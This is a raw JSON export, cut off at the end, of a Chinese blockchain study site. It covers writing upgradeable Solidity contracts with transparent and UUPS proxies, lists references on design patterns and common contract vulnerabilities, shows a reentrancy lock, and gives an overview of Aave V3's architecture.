区块链技术栈\n********************\n\n\n参考\n\nmedium.com/coinmonks/smart-contracts-gas-optimization-techniques-2bd07add0e86\n"},"blockchainguide/DApp_Development/合约高级技巧/死磕solidity之编写可升级合约":{"slug":"blockchainguide/DApp_Development/合约高级技巧/死磕solidity之编写可升级合约","filePath":"blockchainguide/DApp_Development/合约高级技巧/死磕solidity之编写可升级合约.md","title":"死磕solidity之编写可升级合约","links":[],"tags":[],"content":"\n为什么要编写可升级合约\n默认情况下，以太坊中的智能合约是不可变的。但是一旦项目方提前发现合约漏洞或者想升级功能，是需要合约可以变动的，因此一开始编写可升级的合约是重要的。因此我们需要使用可升级的合约来增强可维护性。\n升级合约概述\n升级合约通常是采用代理模式来实现，这种模式的工作原理存在两个合约，一个是代理合约，一个是实现合约，代理合约负责管理合约状态数据，而实现合约只是负责执行合约逻辑，不存储任何状态数据。用户通过调用代理合约，代理合约对实现合约进行delegate call从而达到升级的目的。\n\n目前主要有3种方式来替换/升级实现合约：\n\nDiamond Implementation\nTransparent Proxy Implementation\nUUPS Implementation\n\n目前通用的是透明代理实现和UUPS实现，目的都是为了将实现合约的地址换成新的（升级后的合约），透明代理的方式是把更新实现合约函数updatate to address放在代理合约里，而UUPS是把更新实现合约放在实现合约中。\n透明代理\n透明代理（EIP1967）是一种简单的方法来分离代理合约和合约之间的责任。在这种情况下，upgradeTo函数是代理合约中的一部分，而实现合约可以通过在代理上调用upgradeTo来升级，从而改变未来函数调用的委托位置。\n不过也有一些注意事项。代理合约和实现合约如果有一个名称和参数相同的函数，在透明代理合约中，这个问题由代理合约来处理，代理合约根据msg.sender全局变量来决定用户的调用是在代理合约本身还是在实现合约中执行。\n所以如果msg.sender是代理的管理员，那么代理将不会委托调用，如果它不是管理员地址，代理将把调用委托给实现合约，即使它与代理的某个函数相匹配。\n所以透明代理存在此问题：owner的地址必须存储在存储器中，而使用存储器是与智能合约互动的最低效和最昂贵的步骤之一，每次用户调用代理时，代理会检查用户是否是管理员，这给大多数发生的交易增加了不必要的气体成本。（总而言之成本比较高）\nUUPS\nUUPS代理（EIP1822）是另一种方法来分离代理合约和合约之间的责任。UUPS代理模式下，upgradeTo函数是实现合约的一部分，并且通过代理合约被用户使用delegatecall。\n在UUPS中，不管是管理员还是用户，所有的调用都被发送到实现合约中。这样做的好处是，每次调用时，我们不必访问存储空间来检查开始调用的用户是否是管理员，这提高了效率和成本。另外，因为是实现合约，你可以根据你的需要定制功能，在每一个新的实现中加入诸如Timelock、Access Control等，这在透明代理中是做不到的。\nUUPS代理存在的问题是：upgradeTo函数存在于实现合约中，会增加不少代码，容易被攻击，并且如果开发者忘记添加这个函数，合约将不能再升级了。\n使用OpenZeppelin编写可升级智能合约\n透明代理实战\n\n\n安装 hardhat 环境\n## 安装升级包\n$ yarn add @openzeppelin/contracts @openzeppelin/contracts-upgradeable @openzeppelin/hardhat-upgrades \n \n## 配置文件\nimport { HardhatUserConfig } from &#039;hardhat/config&#039;\nimport &#039;@nomicfoundation/hardhat-toolbox&#039;\nimport &#039;@openzeppelin/hardhat-upgrades&#039;\n \nconst config: HardhatUserConfig = {\n  solidity: &#039;0.8.17&#039;\n}\n \nexport default config\n\n\n编写可升级合约\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n \nimport &quot;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol&quot;;\n \ncontract OpenProxy is Initializable {\n    uint public value;\n \n    function initialize(uint _value) public initializer {\n        value = _value;\n    }\n \n    function increaseValue() external {\n        ++value;\n    }\n}\n \n\n\n部署脚本\nimport { ethers, upgrades } from &#039;hardhat&#039;\n \n// yarn hardhat run scripts/deploy_openProxy.ts --network localhost\nasync function main() {\n    const OpenProxy = await ethers.getContractFactory(&#039;OpenProxy&#039;)\n \n    // 部署合约, 并调用初始化方法\n    const myOpenProxy = await upgrades.deployProxy(OpenProxy, [10], {\n        initializer: &#039;initialize&#039;\n    })\n \n    // 代理合约地址\n    const proxyAddress = myOpenProxy.address\n    // 实现合约地址\n    const implementationAddress = await upgrades.erc1967.getImplementationAddress(myOpenProxy.address)\n    // proxyAdmin 合约地址\n    const adminAddress = await upgrades.erc1967.getAdminAddress(myOpenProxy.address)\n \n    console.log(`proxyAddress: ${proxyAddress}`)\n    console.log(`implementationAddress: ${implementationAddress}`)\n    console.log(`adminAddress: ${adminAddress}`)\n}\n \nmain().catch((error) =&gt; {\n    console.error(error)\n    process.exitCode = 1\n})\n \n\n\n编译合约&amp;启动本地节点&amp;本地网络部署合约\n$ yarn hardhat compile\n$ yarn hardhat node\n$ yarn hardhat run scripts/proxy/open_proxy/openProxy.ts --network localhost\n \n## 部署完毕\nproxyAddress: 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0\nimplementationAddress: 0x5FbDB2315678afecb367f032d93F642f64180aa3\nadminAddress: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512\n \n\n\n实际上部署的合约有三个：\n\n代理合约\n实现合约\nProxyAdmin 合约\n\nProxyAdmin 合约是用来管理代理合约的，包括了升级合约，转移合约所有权。\n升级合约的步骤就是\n\n部署一个新的实现合约，\n调用 ProxyAdmin 合约中升级相关的方法，设置新的实现合约地址。\n\n\n\n新的实现合约\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n \nimport &quot;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol&quot;;\n \ncontract OpenProxyV2 is Initializable {\n    uint public value;\n \n    function initialize(uint _value) public initializer {\n        value = _value;\n    }\n \n    function increaseValue() external {\n        --value;\n    }\n}\n\n\n升级脚本\nimport { ethers } from &quot;hardhat&quot;;\nimport { upgrades } from &quot;hardhat&quot;;\n \nconst proxyAddress = &#039;0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0&#039;\n \nasync function main() {\n    console.log(proxyAddress, &quot; original proxy address&quot;)\n    const OpenProxyV2 = await ethers.getContractFactory(&quot;OpenProxyV2&quot;)\n    console.log(&quot;upgrade to OpenProxyV2...&quot;)\n    const myOpenProxyV2 = await upgrades.upgradeProxy(proxyAddress, OpenProxyV2)\n    console.log(myOpenProxyV2.address, &quot; OpenProxyV2 address(should be the same)&quot;)\n \n    console.log(await upgrades.erc1967.getImplementationAddress(myOpenProxyV2.address), &quot; getImplementationAddress&quot;)\n    console.log(await upgrades.erc1967.getAdminAddress(myOpenProxyV2.address), &quot; getAdminAddress&quot;)\n}\n...\n执行合约升级脚本如下：\n0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0  original proxy address\nupgrade to OpenProxyV2...\n0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0  OpenProxyV2 address(should be the same)\n0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9  getImplementationAddress\n0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512  getAdminAddress\n可以发现代理合约地址和admin合约的地址并没有改变，仅仅是实现合约的地址发生了变化\n\n\n以上通过 upgrades.deployProxy 部署的合约，默认情况下是使用的透明代理模式。如果你要想使用UUPS代理模式，需要显示的指定。\n\nUUPS实战\nhardhat环境还是以上，只不过有两个地方需要更改:\n\n\n编写合约\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n \nimport &quot;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol&quot;;\nimport &quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;;\nimport &quot;@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol&quot;;\n \ncontract LogicV1 is Initializable, UUPSUpgradeable, OwnableUpgradeable {\n    function initialize() public initializer {\n        __Ownable_init();\n        __UUPSUpgradeable_init();\n    }\n \n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer {}\n \n    // 需要此方法来防止未经授权的升级，因为在 UUPS 模式中，升级是从实现合约完成的，而在透明代理模式中，升级是通过代理合约完成的\n    function _authorizeUpgrade(address) internal override onlyOwner {}\n \n    mapping(string =&gt; uint256) private logic;\n \n    event logicSetted(string indexed _key, uint256 _value);\n \n    function SetLogic(string memory _key, uint256 _value) external {\n        logic[_key] = _value;\n        emit logicSetted(_key, _value);\n    }\n \n    function GetLogic(string memory _key) public view returns (uint256) {\n        return logic[_key];\n    }\n}\n \n\n\n合约部署脚本\n## 只需要稍微变动一下\n// 部署合约, 并调用初始化方法\nconst myLogicV1 = await upgrades.deployProxy(LogicV1, {\n  initializer: &#039;initialize&#039;,\n  kind: &#039;uups&#039;\n})\nWarning: A proxy admin was previously deployed on this network\n// 管理员合约实际不存在了，只有代理合约和实现合约\nproxyAddress: 0xa513E6E4b8f2a923D98304ec87F64353C4D5C853\nimplementationAddress: 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707\nadminAddress: 0x0000000000000000000000000000000000000000\n编译并部署 UUPS代理模式的合约时，实际只会部署两个合约\n\n代理合约\n实现合约\n\n此时的升级合约的步骤就是\n\n部署一个新的实现合约，\n调用 ProxyAdmin 合约中升级相关的方法，设置新的实现合约地址。\n\n\n\n\n**************************\n*****wx: mindcarver*******\n*****公众号:区块链技术栈*****\n**************************\n\n参考\n\n文章源码\neips.ethereum.org/EIPS/eip-1822\neips.ethereum.org/EIPS/eip-1967\nblog.openzeppelin.com/the-state-of-smart-contract-upgrades/\nblog.gnosis.pm/solidity-delegateproxy-contracts-e09957d0f201\nblog.openzeppelin.com/deep-dive-into-the-minimal-proxy-contract/\ndocs.openzeppelin.com/upgrades-plugins/1.x/api-hardhat-upgrades\ndocs.openzeppelin.com/upgrades-plugins/1.x/proxies#the-constructor-caveat\n"},"blockchainguide/DApp_Development/合约高级技巧/设计模式/solidity-之设计模式":{"slug":"blockchainguide/DApp_Development/合约高级技巧/设计模式/solidity-之设计模式","filePath":"blockchainguide/DApp_Development/合约高级技巧/设计模式/solidity 之设计模式.md","title":"solidity 之设计模式","links":[],"tags":[],"content":"blog.csdn.net/Tesla_Zhou/article/details/111743243\nwww.yisu.com/zixun/515955.html\nww2.inf.ufg.br/~insight/blockarch2021/ICSA_talk.pdf\nfisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/3_features/35_contract/solidity_design_patterns.html\nblog.logrocket.com/developers-guide-solidity-design-patterns/\ngithub.com/maxwoe/solidity_patterns.git"},"blockchainguide/DApp_Development/合约高级技巧/设计模式/可维护性/contract_regestry":{"slug":"blockchainguide/DApp_Development/合约高级技巧/设计模式/可维护性/contract_regestry","filePath":"blockchainguide/DApp_Development/合约高级技巧/设计模式/可维护性/contract_regestry.md","title":"contract_regestry","links":[],"tags":[],"content":"research.csiro.au/blockchainpatterns/general-patterns/contract-structural-patterns/contract-registry/\ngithub.com/NoharaHiroshi/upgradability-solidity-demo.git"},"blockchainguide/DApp_Development/合约高级技巧/设计模式/可维护性/contract_relay":{"slug":"blockchainguide/DApp_Development/合约高级技巧/设计模式/可维护性/contract_relay","filePath":"blockchainguide/DApp_Development/合约高级技巧/设计模式/可维护性/contract_relay.md","title":"contract_relay","links":[],"tags":[],"content":"github.com/NoharaHiroshi/upgradability-solidity-demo.git\ngithub.com/33357/smartcontract-apps.git"},"blockchainguide/DApp_Development/合约高级技巧/设计模式/可维护性/数据逻辑分离":{"slug":"blockchainguide/DApp_Development/合约高级技巧/设计模式/可维护性/数据逻辑分离","filePath":"blockchainguide/DApp_Development/合约高级技巧/设计模式/可维护性/数据逻辑分离.md","title":"数据逻辑分离","links":[],"tags":[],"content":"developer.aliyun.com/article/617127\nwww.cnblogs.com/Lands-ljk/p/12213543.html\nwww.geekmeta.com/article/1306640.html\nethereum.org/zh/developers/tutorials/smart-contract-security-guidelines/\ngithub.com/NoharaHiroshi/upgradability-solidity-demo.git"},"blockchainguide/DApp_Development/合约高级技巧/设计模式/安全/Rate-Limit":{"slug":"blockchainguide/DApp_Development/合约高级技巧/设计模式/安全/Rate-Limit","filePath":"blockchainguide/DApp_Development/合约高级技巧/设计模式/安全/Rate Limit.md","title":"Rate Limit","links":[],"tags":[],"content":"consensys.github.io/smart-contract-best-practices/development-recommendations/precautions/rate-limiting/\ngithub.com/maxwoe/solidity_patterns.git\ngithub.com/NoharaHiroshi/upgradability-solidity-demo.git"},"blockchainguide/DApp_Development/合约高级技巧/设计模式/安全/mutex":{"slug":"blockchainguide/DApp_Development/合约高级技巧/设计模式/安全/mutex","filePath":"blockchainguide/DApp_Development/合约高级技巧/设计模式/安全/mutex.md","title":"mutex","links":[],"tags":[],"content":"禁止递归\ngithub.com/maxwoe/solidity_patterns.git\ngithub.com/NoharaHiroshi/upgradability-solidity-demo.git\ngithub.com/33357/smartcontract-apps.git"},"blockchainguide/DApp_Development/合约高级技巧/设计模式/安全/speed_bump":{"slug":"blockchainguide/DApp_Development/合约高级技巧/设计模式/安全/speed_bump","filePath":"blockchainguide/DApp_Development/合约高级技巧/设计模式/安全/speed_bump.md","title":"speed_bump","links":[],"tags":[],"content":"github.com/maxwoe/solidity_patterns.git\ngithub.com/NoharaHiroshi/upgradability-solidity-demo.git"},"blockchainguide/DApp_Development/合约高级技巧/设计模式/安全/安全转账":{"slug":"blockchainguide/DApp_Development/合约高级技巧/设计模式/安全/安全转账","filePath":"blockchainguide/DApp_Development/合约高级技巧/设计模式/安全/安全转账.md","title":"安全转账","links":[],"tags":[],"content":"codeantenna.com/a/CFr6RnHdQr\ndreamerjonson.com/2018/11/20/solidity-25-thansfer2/index.html\nlearnblockchain.cn/article/2191\nblog.csdn.net/m0_37714470/article/details/119113895\nrobinchen95.com/documents/Refer/36-智能合约安全综述.pdf\ngithub.com/maxwoe/solidity_patterns.git\ngithub.com/NoharaHiroshi/upgradability-solidity-demo.git\ngithub.com/33357/smartcontract-apps.git"},"blockchainguide/DApp_Development/合约高级技巧/设计模式/生命周期/允许合约自动停止":{"slug":"blockchainguide/DApp_Development/合约高级技巧/设计模式/生命周期/允许合约自动停止","filePath":"blockchainguide/DApp_Development/合约高级技巧/设计模式/生命周期/允许合约自动停止.md","title":"允许合约自动停止","links":[],"tags":[],"content":"github.com/maxwoe/solidity_patterns.git"},"blockchainguide/DApp_Development/合约高级技巧/设计模式/生命周期/允许合约自毁":{"slug":"blockchainguide/DApp_Development/合约高级技巧/设计模式/生命周期/允许合约自毁","filePath":"blockchainguide/DApp_Development/合约高级技巧/设计模式/生命周期/允许合约自毁.md","title":"允许合约自毁","links":[],"tags":[],"content":"github.com/maxwoe/solidity_patterns.git"},"blockchainguide/DApp_Development/安全审计/合约漏洞/不要在合约中存隐私数据":{"slug":"blockchainguide/DApp_Development/安全审计/合约漏洞/不要在合约中存隐私数据","filePath":"blockchainguide/DApp_Development/安全审计/合约漏洞/不要在合约中存隐私数据.md","title":"不要在合约中存隐私数据","links":[],"tags":[],"content":"foresightnews.xyz/article/detail/1511"},"blockchainguide/DApp_Development/安全审计/合约漏洞/参阅的大部分资料":{"slug":"blockchainguide/DApp_Development/安全审计/合约漏洞/参阅的大部分资料","filePath":"blockchainguide/DApp_Development/安全审计/合约漏洞/参阅的大部分资料.md","title":"参阅的大部分资料","links":[],"tags":[],"content":"![image-20230109093443882](/Users/carver/Library/Application Support/typora-user-images/image-20230109093443882.png)"},"blockchainguide/DApp_Development/安全审计/合约漏洞/拒绝服务攻击":{"slug":"blockchainguide/DApp_Development/安全审计/合约漏洞/拒绝服务攻击","filePath":"blockchainguide/DApp_Development/安全审计/合约漏洞/拒绝服务攻击.md","title":"拒绝服务攻击","links":[],"tags":[],"content":"xz.aliyun.com/t/9871"},"blockchainguide/DApp_Development/安全审计/合约漏洞/提案攻击":{"slug":"blockchainguide/DApp_Development/安全审计/合约漏洞/提案攻击","filePath":"blockchainguide/DApp_Development/安全审计/合约漏洞/提案攻击.md","title":"提案攻击","links":[],"tags":[],"content":"blog.chain.link/market-manipulation-vs-oracle-exploits-zh/"},"blockchainguide/DApp_Development/安全审计/合约漏洞/权限控制漏洞":{"slug":"blockchainguide/DApp_Development/安全审计/合约漏洞/权限控制漏洞","filePath":"blockchainguide/DApp_Development/安全审计/合约漏洞/权限控制漏洞.md","title":"权限控制漏洞","links":[],"tags":[],"content":"参考\nlearnblockchain.cn/article/4726\nlearnblockchain.cn/article/1438"},"blockchainguide/DApp_Development/安全审计/合约漏洞/短地址参数攻击":{"slug":"blockchainguide/DApp_Development/安全审计/合约漏洞/短地址参数攻击","filePath":"blockchainguide/DApp_Development/安全审计/合约漏洞/短地址参数攻击.md","title":"短地址参数攻击","links":[],"tags":[],"content":"短地址攻击是利用EVM在参数长度不够时自动在右方补0的特性，通过去除钱包地址末位的0，达到将转账金额左移放大的效果。目前主要依靠客户端主动检查地址长度来避免该问题，另外web3层面也增加了参数格式校验。虽然EVM层仍然可以复现，但是在实际应用场景中基本没有问题。\n参考\nwww.anquanke.com/post/id/214757\nzhuanlan.zhihu.com/p/34470071\nethbook.abyteahead.com/ch10/shortattack.html\nwww.freebuf.com/articles/blockchain-articles/199903.html"},"blockchainguide/DApp_Development/安全审计/合约漏洞/算法上下溢出":{"slug":"blockchainguide/DApp_Development/安全审计/合约漏洞/算法上下溢出","filePath":"blockchainguide/DApp_Development/安全审计/合约漏洞/算法上下溢出.md","title":"算法上下溢出","links":[],"tags":[],"content":"zhuanlan.zhihu.com/p/105471579\n用openzepplin的库safemath库\n尽可能使用高版本的solidity . 0.4 的版本有溢出问题，0.8的solidity版本已经解决了"},"blockchainguide/DApp_Development/安全审计/合约漏洞/重入攻击手段":{"slug":"blockchainguide/DApp_Development/安全审计/合约漏洞/重入攻击手段","filePath":"blockchainguide/DApp_Development/安全审计/合约漏洞/重入攻击手段.md","title":"重入攻击手段","links":[],"tags":[],"content":"重入攻击类型\n\n单函数重入\n跨函数重入\n跨合约重入\n\n单函数重入\n跨函数重入\n跨合约重入\n避免重入攻击\n互斥锁模式\nuint private unlocked = 1;\n    modifier lock() {\n        require(unlocked == 1, &#039;UniswapV2: LOCKED&#039;);\n        unlocked = 0;\n        _;\n        unlocked = 1;\n    }\n段代码定义了一个名为lock的函数修饰器（modifier）。由于这个修饰器是在智能合约内定义的，在智能合约内，可以把修饰器看成是一个包裹函数，它会包裹在被修饰的函数外面。\n这个修饰器的主要作用就是在被修饰的函数执行时防止重入攻击。重入攻击指的是当一个智能合约在执行一个函数时，又会出发同一个或另一个合约的调用，如果不加控制地一直递归执行下去，可能会导致合约出现重复执行或者数据错误等问题。\n具体来说，这个修饰器会首先判断变量unlocked的值是否为1，只有在unlocked等于1时，才允许调用被修饰的函数。然后，修饰器会将unlocked的值修改为0，并执行被修饰的函数（用_表示）。最后，被修饰的函数执行结束后，修饰器会再将unlocked的值修改为1，以便下次调用。\n这种设计可以保证，在被修饰的函数执行期间，其他合约调用该合约的同一个函数时，都会被拒绝，从而避免了重入攻击的发生。\n需要注意的是，在使用这个修饰器的时候，需要定义一个名为unlocked的全局变量，并且需要在智能合约的其他地方修改unlocked的值。这个变量是用来控制修饰器的执行行为的。\n参考\nwww.aqniu.com/vendor/88702.html\npaper.seebug.org/632/\nwww.cnblogs.com/wanghui-garcia/p/9580573.html  solidity安全开发指南\nconsensys.github.io/smart-contract-best-practices/development-recommendations/general/external-calls/#favor-pull-over-push-for-external-calls"},"blockchainguide/DApp_Development/安全审计/合约漏洞/重放攻击":{"slug":"blockchainguide/DApp_Development/安全审计/合约漏洞/重放攻击","filePath":"blockchainguide/DApp_Development/安全审计/合约漏洞/重放攻击.md","title":"重放攻击","links":[],"tags":[],"content":"learnblockchain.cn/article/5030\nlearnblockchain.cn/article/4539"},"blockchainguide/DApp_Development/安全审计/安全相关资料":{"slug":"blockchainguide/DApp_Development/安全审计/安全相关资料","filePath":"blockchainguide/DApp_Development/安全审计/安全相关资料.md","title":"安全相关资料","links":[],"tags":[],"content":"www.google.com/url%3A%2F%2Fpaper.seebug.org%2F632%2F&amp;usg=AOvVaw14eo8RAc762vHREfHWyWtU\nmirror.xyz/ninjak.eth/ygaDE0QQwn3lfI-AVaw0ZMqHQtWCdzo-XV450j2camc\npaper.seebug.org/632/\nethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488 （合约漏洞合集网站）\nconsensys.github.io/smart-contract-best-practices/development-recommendations/general/external-calls/#favor-pull-over-push-for-external-calls  openzepplin安全开发建议"},"blockchainguide/DApp_Development/应用场景/defi/aave/01-核心概念与架构":{"slug":"blockchainguide/DApp_Development/应用场景/defi/aave/01-核心概念与架构","filePath":"blockchainguide/DApp_Development/应用场景/defi/aave/01-核心概念与架构.md","title":"01-核心概念与架构","links":[],"tags":[],"content":"Aave V3 核心概念与架构\n1. 协议概述\n1.1 什么是 Aave\nAave 是一个去中心化的非托管流动性协议，允许用户：\n\n存款赚取利息：将资产存入流动性池，获得被动收益\n抵押借贷：以存款作为抵押品借出其他资产\n闪电贷：在单笔交易内无抵押借贷\n\n1.2 V3 相对 V2 的核心升级\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性V2V3改进资本效率基础E-Mode 提升最高 97% LTV风险管理统一参数隔离模式细粒度控制跨链能力无Portal 桥接原生跨链Gas 消耗~180k~150k降低 16%+L2 优化无L2Poolcalldata 压缩\n\n2. 整体架构设计\n2.1 分层架构\n┌────────────────────────────────────────────────────────────┐\n│                    第一层: 用户交互层                       │\n│  ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐          │\n│  │ supply  │ │ borrow  │ │liquidate│ │flashLoan│          │\n│  └─────────┘ └─────────┘ └─────────┘ └─────────┘          │\n└────────────────────────────────────────────────────────────┘\n                            │\n                            ▼\n┌────────────────────────────────────────────────────────────┐\n│                    第二层: 核心协调层                       │\n│  ┌──────────────────────────────────────────────────┐     │\n│  │                    Pool.sol                       │     │\n│  │  - 统一入口点                                     │     │\n│  │  - 状态协调                                       │     │\n│  │  - 权限检查                                       │     │\n│  └──────────────────────────────────────────────────┘     │\n│  ┌─────────────────┐ ┌─────────────────┐                  │\n│  │PoolConfigurator │ │PoolAddressesProvider│               │\n│  │   配置管理器    │ │    地址注册中心   │                 │\n│  └─────────────────┘ └─────────────────┘                  │\n└────────────────────────────────────────────────────────────┘\n                            │\n                            ▼\n┌────────────────────────────────────────────────────────────┐\n│                    第三层: 业务逻辑层                       │\n│  ┌───────────┐ ┌───────────┐ ┌───────────┐ ┌───────────┐  │\n│  │SupplyLogic│ │BorrowLogic│ │Liquidation│ │FlashLoan  │  │\n│  │   Logic   │ │   Logic   │ │   Logic   │ │   Logic   │  │\n│  └───────────┘ └───────────┘ └───────────┘ └───────────┘  │\n│  ┌───────────┐ ┌───────────┐ ┌───────────┐ ┌───────────┐  │\n│  │ EModeLogic│ │BridgeLogic│ │Validation │ │GenericLogic│ │\n│  │           │ │  (Portal) │ │   Logic   │ │           │  │\n│  └───────────┘ └───────────┘ └───────────┘ └───────────┘  │\n└────────────────────────────────────────────────────────────┘\n                            │\n                            ▼\n┌────────────────────────────────────────────────────────────┐\n│                    第四层: 代币化层                         │\n│  ┌───────────────┐ ┌───────────────┐ ┌───────────────┐    │\n│  │    AToken     │ │StableDebtToken│ │VariableDebt   │    │\n│  │   存款凭证    │ │  固定利率债务  │ │Token 浮动债务 │    │\n│  └───────────────┘ └───────────────┘ └───────────────┘    │\n└────────────────────────────────────────────────────────────┘\n                            │\n                            ▼\n┌────────────────────────────────────────────────────────────┐\n│                    第五层: 基础设施层                       │\n│  ┌───────────┐ ┌───────────┐ ┌───────────┐ ┌───────────┐  │\n│  │PriceOracle│ │InterestRate│ │DataTypes  │ │WadRayMath │  │\n│  │  价格预言机 │ │ Strategy  │ │ 数据结构  │ │  数学库   │  │\n│  └───────────┘ └───────────┘ └───────────┘ └───────────┘  │\n└────────────────────────────────────────────────────────────┘\n\n2.2 核心合约关系\n// Pool.sol 是核心入口\ncontract Pool is VersionedInitializable, PoolStorage, IPool {\n    // 存款\n    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode);\n \n    // 借贷\n    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf);\n \n    // 还款\n    function repay(address asset, uint256 amount, uint256 interestRateMode, address onBehalfOf);\n \n    // 清算\n    function liquidationCall(address collateralAsset, address debtAsset, address user, uint256 debtToCover, bool receiveAToken);\n \n    // 闪电贷\n    function flashLoan(address receiverAddress, address[] calldata assets, uint256[] calldata amounts, uint256[] calldata interestRateModes, address onBehalfOf, bytes calldata params, uint16 referralCode);\n}\n\n3. 核心设计模式\n3.1 代理模式 (Proxy Pattern)\nAave V3 使用透明代理模式实现合约可升级性：\n┌─────────────────┐        ┌─────────────────┐\n│   用户调用      │───────▶│  Proxy 合约     │\n└─────────────────┘        │  (存储状态)     │\n                           └────────┬────────┘\n                                    │ delegatecall\n                                    ▼\n                           ┌─────────────────┐\n                           │ Implementation  │\n                           │   (逻辑代码)    │\n                           └─────────────────┘\n\n实现代码：\n// contracts/protocol/libraries/aave-upgradeability/\ncontract InitializableImmutableAdminUpgradeabilityProxy is BaseAdminUpgradeabilityProxy {\n    address private immutable _admin;\n \n    constructor(address admin) {\n        _admin = admin;\n        // EIP-1967 标准存储槽\n        assert(_ADMIN_SLOT == bytes32(uint256(keccak256(&quot;eip1967.proxy.admin&quot;)) - 1));\n    }\n \n    function _willFallback() internal override {\n        require(msg.sender != _admin, &#039;Cannot call fallback function from the proxy admin&#039;);\n        super._willFallback();\n    }\n}\n优势：\n\n合约逻辑可升级，无需迁移用户资金\n存储布局保持一致\n管理员与用户调用路径分离\n\n3.2 库委托调用模式 (Library Delegatecall)\n将业务逻辑拆分到独立的库合约中：\n// Pool.sol 中调用库\nfunction supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode)\n    public virtual override {\n    // 委托给 SupplyLogic 库执行\n    SupplyLogic.executeSupply(\n        _reserves,\n        _reservesList,\n        _usersConfig[onBehalfOf],\n        DataTypes.ExecuteSupplyParams({\n            asset: asset,\n            amount: amount,\n            onBehalfOf: onBehalfOf,\n            referralCode: referralCode\n        })\n    );\n}\n优势：\n\n绕过合约大小限制 (24KB)\n代码模块化，易于维护\n降低部署成本\n\n3.3 位图配置存储 (Bitmap Configuration)\n使用单个 uint256 存储多个配置参数：\nstruct ReserveConfigurationMap {\n    // 位布局说明：\n    // bit 0-15:   LTV (贷款价值比)\n    // bit 16-31:  Liquidation threshold (清算阈值)\n    // bit 32-47:  Liquidation bonus (清算奖励)\n    // bit 48-55:  Decimals (精度)\n    // bit 56:     reserve is active (是否激活)\n    // bit 57:     reserve is frozen (是否冻结)\n    // bit 58:     borrowing is enabled (是否可借贷)\n    // bit 59:     stable rate borrowing enabled (是否支持固定利率)\n    // bit 60:     asset is paused (是否暂停)\n    // bit 61:     borrowing in isolation mode enabled\n    // bit 62:     siloed borrowing enabled\n    // bit 63:     flashloaning enabled\n    // bit 64-79:  reserve factor (协议费率)\n    // bit 80-115: borrow cap (借贷上限)\n    // bit 116-151: supply cap (存款上限)\n    // bit 152-167: liquidation protocol fee\n    // bit 168-175: eMode category\n    // bit 176-211: unbacked mint cap\n    // bit 212-251: debt ceiling (隔离模式债务上限)\n    uint256 data;\n}\n位操作示例：\nlibrary ReserveConfiguration {\n    uint256 internal constant LTV_MASK =                       0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000;\n    uint256 internal constant LIQUIDATION_THRESHOLD_MASK =     0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000FFFF;\n \n    function getLtv(DataTypes.ReserveConfigurationMap storage self) internal view returns (uint256) {\n        return self.data &amp; ~LTV_MASK;  // 取低 16 位\n    }\n \n    function setLtv(DataTypes.ReserveConfigurationMap storage self, uint256 ltv) internal {\n        require(ltv &lt;= MAX_VALID_LTV, &#039;Invalid LTV&#039;);\n        self.data = (self.data &amp; LTV_MASK) | ltv;\n    }\n}\nGas 优化效果：\n\n单次 SSTORE 更新多个参数\n读取配置只需一次 SLOAD\n原子操作保证配置一致性\n\n\n4. 数据结构详解\n4.1 ReserveData - 储备数据\nstruct ReserveData {\n    // 配置参数 (位图)\n    ReserveConfigurationMap configuration;\n \n    // 流动性指数 (27位精度)\n    uint128 liquidityIndex;\n \n    // 当前存款利率\n    uint128 currentLiquidityRate;\n \n    // 可变借贷指数\n    uint128 variableBorrowIndex;\n \n    // 当前可变借贷利率\n    uint128 currentVariableBorrowRate;\n \n    // 当前固定借贷利率\n    uint128 currentStableBorrowRate;\n \n    // 最后更新时间戳\n    uint40 lastUpdateTimestamp;\n \n    // 储备 ID\n    uint16 id;\n \n    // aToken 地址\n    address aTokenAddress;\n \n    // 固定债务代币地址\n    address stableDebtTokenAddress;\n \n    // 可变债务代币地址\n    address variableDebtTokenAddress;\n \n    // 利率策略地址\n    address interestRateStrategyAddress;\n \n    // 累积到国库的费用\n    uint128 accruedToTreasury;\n \n    // Portal 未支持的铸造量\n    uint128 unbacked;\n \n    // 隔离模式总债务\n    uint128 isolationModeTotalDebt;\n}\n存储优化：\nSlot 0: configuration (256 bits)\nSlot 1: liquidityIndex (128) + currentLiquidityRate (128)\nSlot 2: variableBorrowIndex (128) + currentVariableBorrowRate (128)\nSlot 3: currentStableBorrowRate (128) + lastUpdateTimestamp (40) + id (16) + ... (72 bits)\nSlot 4: aTokenAddress (160)\nSlot 5: stableDebtTokenAddress (160)\nSlot 6: variableDebtTokenAddress (160)\nSlot 7: interestRateStrategyAddress (160)\nSlot 8: accruedToTreasury (128) + unbacked (128)\nSlot 9: isolationModeTotalDebt (128) + ...\n\n4.2 UserConfigurationMap - 用户配置\nstruct UserConfigurationMap {\n    // 每个储备占用 2 位:\n    // - bit 